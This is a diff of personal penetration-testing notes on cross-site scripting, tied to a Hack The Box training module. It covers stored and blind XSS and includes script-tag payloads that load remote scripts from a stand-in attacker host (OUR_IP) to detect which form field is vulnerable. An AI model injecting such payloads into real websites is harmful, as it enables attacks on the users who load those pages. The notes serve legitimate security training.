@@ -1,5 +1,5 @@
 # XSS and CSRF
-XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side. Of course these vulnerabilities run entirely within the browser's sandbox and is confined to what the browser can do.
+XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side. Of course these vulnerabilities run entirely within the browser's sandbox and is confined to what the browser can do... it's really just JavaScript injection just like SQL injection
 
 # Resources
 - [HTB Cross-Site Scripting (XSS) Module](https://academy.hackthebox.com/module/103/section/965)
@@ -62,7 +62,6 @@ Code review is the most reliable way to get a XSS rather than throwing automated
 | Load remote script to look for blind XSS | `<script src="http://OUR_IP/script.js"></script>` |
 
 
-Kim, Peter. The Hacker Playbook 3: Practical Guide To Penetration Testing (p. 93). Secure Planet. Kindle Edition. 
 # Notes
 ## Stored XSS
 Most critical where the injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.
@@ -94,11 +93,7 @@ Occurs when the vulnerability is triggered on a page we don't have access to lik
 - Support Tickets
 - HTTP User-Agent header
 
-The following will let us know which of the fields (`fullname` or `username`) is vulnerable based of what we see on our listener:
-```js
-<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
-<script src=http://OUR_IP/username></script> #this goes inside the username field
-```
+
 
 
 
@@ -177,6 +172,11 @@ Execution Sinks:
 - If you're defacing, you can always open the `.html` locally to test how it looks
 - Email fields usually must match an email format, even if we try manipulating the HTTP request parameters, as it's usually validated on both the front-end and the back-end. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.
 - Most common XSS protections are length issues and not allowing < or > or according to THP1.
+- The following will let us know which of the fields (`fullname` or `username`) is vulnerable based of what we see on our listener:
+```js
+<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
+<script src=http://OUR_IP/username></script> #this goes inside the username field
+```
 
 # HTB Module questions
 ## Cross-Site Scripting (XSS)
